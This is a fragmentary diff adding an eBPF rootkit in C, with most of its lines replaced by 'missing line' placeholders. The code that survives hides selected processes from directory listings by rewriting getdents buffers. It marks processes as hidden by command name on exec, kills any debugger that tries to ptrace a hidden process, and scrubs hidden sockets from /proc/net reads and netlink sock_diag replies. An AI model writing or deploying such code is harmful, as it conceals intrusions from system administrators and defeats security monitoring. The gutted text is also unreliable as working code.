@@ -1,0 +1,623 @@
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+    return bpf_map_lookup_elem(&hidden_pids, &pid) != 0;
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+static __attribute__((noinline)) u32 name_to_pid(const char *name)
+/* missing line */
+/* missing line */
+/* missing line */
+        u8 c = (u8)name[i];
+        if (c == 0) break;
+        if (c < '0' || c > '9') return 0;
+        n = n * 10 + (c - '0');
+/* missing line */
+/* missing line */
+}
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+int enter_getdents(struct sys_enter_ctx *ctx)
+/* missing line */
+    u64 id  = bpf_get_current_pid_tgid();
+    u64 buf = (u64)ctx->args[1];
+    bpf_map_update_elem(&scratch, &id, &buf, BPF_ANY);
+    return 0;
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+static long walk_dirent(u32 i, void *data)
+/* missing line */
+/* missing line */
+    if (c->off >= c->total)
+/* missing line */
+/* missing line */
+    u16 rlen = 0;
+    if (bpf_probe_read_user(&rlen, sizeof(rlen),
+                            (void *)(c->buf + c->off + 16)) < 0 || rlen == 0)
+/* missing line */
+/* missing line */
+    char name[16] = {};
+    bpf_probe_read_user(name, sizeof(name), (void *)(c->buf + c->off + 19));
+/* missing line */
+    u32 pid = name_to_pid(name);
+/* missing line */
+    if (pid > 0 && pid_hidden(pid)) {
+        if (c->prev_off >= 0) {
+            u16 merged = c->prev_rlen + rlen;
+            bpf_probe_write_user((void *)(c->buf + c->prev_off + 16),
+/* missing line */
+            c->prev_rlen = merged;
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+            long next_off = c->off + rlen;
+            u16 next_rlen = 0;
+            if (next_off < c->total &&
+                bpf_probe_read_user(&next_rlen, 2,
+                    (void *)(c->buf + next_off + 16)) == 0 &&
+/* missing line */
+/* missing line */
+                u64 next_ino  = 0;
+                u64 next_doff = 0;
+                u8  next_type = 0;
+                char next_name[16] = {};
+                bpf_probe_read_user(&next_ino,  8, (void *)(c->buf + next_off +  0));
+                bpf_probe_read_user(&next_doff, 8, (void *)(c->buf + next_off +  8));
+                bpf_probe_read_user(&next_type, 1, (void *)(c->buf + next_off + 18));
+                bpf_probe_read_user(next_name, sizeof(next_name),
+                                    (void *)(c->buf + next_off + 19));
+                bpf_probe_write_user((void *)(c->buf + c->off +  0), &next_ino,  8);
+                bpf_probe_write_user((void *)(c->buf + c->off +  8), &next_doff, 8);
+                bpf_probe_write_user((void *)(c->buf + c->off + 18), &next_type, 1);
+                bpf_probe_write_user((void *)(c->buf + c->off + 19), next_name,
+/* missing line */
+                u16 merged = rlen + next_rlen;
+                bpf_probe_write_user((void *)(c->buf + c->off + 16), &merged, 2);
+                c->prev_off  = c->off;
+                c->prev_rlen = merged;
+                c->off      += next_rlen; // bottom adds rlen → total advance = rlen + next_rlen
+/* missing line */
+/* missing line */
+                u8 zero = 0;
+                bpf_probe_write_user((void *)(c->buf + c->off + 19), &zero, 1);
+/* missing line */
+/* missing line */
+/* missing line */
+        c->prev_off  = c->off;
+        c->prev_rlen = rlen;
+/* missing line */
+/* missing line */
+    c->off += rlen;
+/* missing line */
+}
+/* missing line */
+/* missing line */
+int exit_getdents(struct sys_exit_ctx *ctx)
+/* missing line */
+    u64 id = bpf_get_current_pid_tgid();
+    u64 *bufp = bpf_map_lookup_elem(&scratch, &id);
+    if (!bufp) return 0;
+    u64 buf = *bufp;
+    bpf_map_delete_elem(&scratch, &id);
+/* missing line */
+    long total = ctx->ret;
+    if (total <= 0) return 0;
+/* missing line */
+    struct dirent_ctx c = {
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+    bpf_loop(1024, walk_dirent, &c, 0);
+/* missing line */
+/* missing line */
+}
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+int on_exec(void *ctx)
+/* missing line */
+/* missing line */
+    bpf_get_current_comm(comm, sizeof(comm));
+/* missing line */
+    if (!bpf_map_lookup_elem(&hidden_names, comm))
+/* missing line */
+/* missing line */
+    u32 pid = (u32)(bpf_get_current_pid_tgid() >> 32);
+    u8  val = 1;
+    bpf_map_update_elem(&hidden_pids, &pid, &val, BPF_ANY);
+/* missing line */
+}
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+    long req = (long)ctx->args[0];
+    if (req != PTRACE_ATTACH && req != PTRACE_SEIZE)
+/* missing line */
+/* missing line */
+    u32 target = (u32)(unsigned long)ctx->args[1];
+    if (pid_hidden(target))
+        bpf_send_signal(9);
+/* missing line */
+/* missing line */
+}
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+    u32 pos = c->start + i;
+    if (pos >= c->end) return 1;
+    u8 z = 0;
+    bpf_probe_write_user((void *)(c->buf + pos), &z, 1);
+/* missing line */
+}
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+static long scan_net_byte(u32 i, void *data)
+/* missing line */
+/* missing line */
+    if (i >= c->len) return 1;
+/* missing line */
+    u32 wpos = c->wpos;
+    if (wpos > i) return 1;  // wpos never exceeds rpos; bounds wpos for verifier
+/* missing line */
+    u8 ch = 0;
+    bpf_probe_read_user(&ch, 1, (void *)(c->buf + i));
+    bpf_probe_write_user((void *)(c->buf + wpos), &ch, 1);
+/* missing line */
+    if (ch == '\n') {
+        int hide = c->inode_val != 0 &&
+                   bpf_map_lookup_elem(&hidden_inodes, &c->inode_val) != NULL;
+        if (hide) {
+            c->wpos = c->line_wstart;
+        } else {
+            c->wpos = wpos + 1;
+/* missing line */
+        c->line_wstart = c->wpos;
+        c->field       = 0;
+        c->in_field    = 0;
+        c->inode_val   = 0;
+/* missing line */
+        if (ch == ' ' || ch == '\t') {
+            if (c->in_field) { c->field++; c->in_field = 0; }
+/* missing line */
+            if (!c->in_field) c->in_field = 1;
+            if (c->field == 9 && ch >= '0' && ch <= '9')
+                c->inode_val = c->inode_val * 10 + (ch - '0');
+/* missing line */
+        c->wpos = wpos + 1;
+/* missing line */
+/* missing line */
+}
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+    if (bpf_probe_read_user(pb, sizeof(pb), (void *)ctx->args[1]) < 0)
+/* missing line */
+    if (pb[0]!='/' || pb[1]!='p' || pb[2]!='r' || pb[3]!='o' || pb[4]!='c' ||
+/* missing line */
+/* missing line */
+/* missing line */
+    u64 id = bpf_get_current_pid_tgid();
+    u8 val = 1;
+    bpf_map_update_elem(&net_open_temp, &id, &val, BPF_ANY);
+/* missing line */
+}
+/* missing line */
+/* missing line */
+int net_exit_openat(struct sys_exit_ctx *ctx)
+/* missing line */
+    u64 id = bpf_get_current_pid_tgid();
+    if (!bpf_map_lookup_elem(&net_open_temp, &id)) return 0;
+    bpf_map_delete_elem(&net_open_temp, &id);
+    long fd = ctx->ret;
+    if (fd < 0) return 0;
+    u32 tgid = (u32)(id >> 32);
+    u64 key  = ((u64)tgid << 32) | (u32)fd;
+    u8 val = 1;
+    bpf_map_update_elem(&net_fds, &key, &val, BPF_ANY);
+/* missing line */
+}
+/* missing line */
+/* missing line */
+int net_enter_read(struct sys_enter_ctx *ctx)
+/* missing line */
+    u64 id   = bpf_get_current_pid_tgid();
+/* missing line */
+    u32 fd   = (u32)(long)ctx->args[0];
+    u64 key  = ((u64)tgid << 32) | fd;
+    if (!bpf_map_lookup_elem(&net_fds, &key)) return 0;
+    u64 buf = (u64)ctx->args[1];
+    bpf_map_update_elem(&net_read_temp, &id, &buf, BPF_ANY);
+/* missing line */
+}
+/* missing line */
+/* missing line */
+int net_exit_read(struct sys_exit_ctx *ctx)
+/* missing line */
+    u64 id    = bpf_get_current_pid_tgid();
+    u64 *bufp = bpf_map_lookup_elem(&net_read_temp, &id);
+    if (!bufp) return 0;
+    u64 buf = *bufp;
+    bpf_map_delete_elem(&net_read_temp, &id);
+    long nbytes = ctx->ret;
+/* missing line */
+/* missing line */
+    if (nbytes <= 0 || nbytes > 65535) return 0;
+/* missing line */
+    struct net_scan_ctx c = {
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+    bpf_loop(65536, scan_net_byte, &c, 0);
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+    u32 wpos = c.wpos;
+    if (wpos >= (u32)nbytes) return 0;
+/* missing line */
+    struct net_zero_ctx zc = {
+/* missing line */
+/* missing line */
+    bpf_loop((u32)nbytes - wpos, zero_net_tail, &zc, 0);
+/* missing line */
+/* missing line */
+}
+/* missing line */
+/* missing line */
+int net_enter_close(struct sys_enter_ctx *ctx)
+/* missing line */
+    u64 id   = bpf_get_current_pid_tgid();
+/* missing line */
+    u32 fd   = (u32)(long)ctx->args[0];
+    u64 key  = ((u64)tgid << 32) | fd;
+    bpf_map_delete_elem(&net_fds,  &key);
+    bpf_map_delete_elem(&diag_fds, &key);
+    return 0;
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+static long walk_nlmsg(u32 i, void *data)
+/* missing line */
+/* missing line */
+    if (c->off + 16 > c->len) return 1;
+/* missing line */
+    u32 nlmsg_len  = 0;
+    u16 nlmsg_type = 0;
+    bpf_probe_read_user(&nlmsg_len,  4, (void *)(c->buf + c->off));
+    bpf_probe_read_user(&nlmsg_type, 2, (void *)(c->buf + c->off + 4));
+/* missing line */
+    if (nlmsg_len < 16 || nlmsg_type == NLMSG_DONE) return 1;
+/* missing line */
+    if (nlmsg_type == SOCK_DIAG_BY_FAMILY &&
+        c->off + IDIAG_INODE_OFF + 4 <= c->len) {
+        u32 inode32 = 0;
+        bpf_probe_read_user(&inode32, 4, (void *)(c->buf + c->off + IDIAG_INODE_OFF));
+        u64 inode64 = inode32;
+        if (inode64 && bpf_map_lookup_elem(&hidden_inodes, &inode64)) {
+            u16 noop = NLMSG_NOOP;
+            bpf_probe_write_user((void *)(c->buf + c->off + 4), &noop, 2);
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+    long aligned = ((long)nlmsg_len + 3) & ~3L;
+    if (aligned < 16) return 1;
+    c->off += aligned;
+/* missing line */
+}
+/* missing line */
+/* missing line */
+/* missing line */
+/* missing line */
+    int domain   = (int)(long)ctx->args[0];
+/* missing line */
+    if (domain != AF_NETLINK || protocol != NETLINK_SOCK_DIAG)
+/* missing line */
+    u64 id  = bpf_get_current_pid_tgid();
+    u8  val = 1;
+    bpf_map_update_elem(&sock_open_temp, &id, &val, BPF_ANY);
+/* missing line */
+}
+/* missing line */
+/* missing line */
+int exit_socket(struct sys_exit_ctx *ctx)
+/* missing line */
+    u64 id = bpf_get_current_pid_tgid();
+    if (!bpf_map_lookup_elem(&sock_open_temp, &id)) return 0;
+    bpf_map_delete_elem(&sock_open_temp, &id);
+    long fd = ctx->ret;
+    if (fd < 0) return 0;
+    u32 tgid = (u32)(id >> 32);
+    u64 key  = ((u64)tgid << 32) | (u32)fd;
+    u8 val = 1;
+    bpf_map_update_elem(&diag_fds, &key, &val, BPF_ANY);
+/* missing line */
+}
+/* missing line */
+/* missing line */
+int enter_recvmsg(struct sys_enter_ctx *ctx)
+/* missing line */
+    u64 id   = bpf_get_current_pid_tgid();
+/* missing line */
+    u32 fd   = (u32)(long)ctx->args[0];
+    u64 key  = ((u64)tgid << 32) | fd;
+    if (!bpf_map_lookup_elem(&diag_fds, &key)) return 0;
+    u64 msgp = (u64)ctx->args[1];  // struct msghdr *
+    bpf_map_update_elem(&recvmsg_temp, &id, &msgp, BPF_ANY);
+/* missing line */
+}
+/* missing line */
+/* missing line */
+int exit_recvmsg(struct sys_exit_ctx *ctx)
+/* missing line */
+    u64 id     = bpf_get_current_pid_tgid();
+    u64 *msgpp = bpf_map_lookup_elem(&recvmsg_temp, &id);
+    if (!msgpp) return 0;
+    u64 msgp = *msgpp;
+    bpf_map_delete_elem(&recvmsg_temp, &id);
+    long nbytes = ctx->ret;
+    if (nbytes <= 0) return 0;
+/* missing line */
+/* missing line */
+    u64 iov_ptr = 0;
+    if (bpf_probe_read_user(&iov_ptr, 8, (void *)(msgp + 16)) < 0 || !iov_ptr)
+/* missing line */
+/* missing line */
+    u64 buf = 0;
+    if (bpf_probe_read_user(&buf, 8, (void *)iov_ptr) < 0 || !buf)
+/* missing line */
+/* missing line */
+    struct diag_scan_ctx c = { .buf = buf, .len = nbytes, .off = 0 };
+    bpf_loop(256, walk_nlmsg, &c, 0);
+/* missing line */
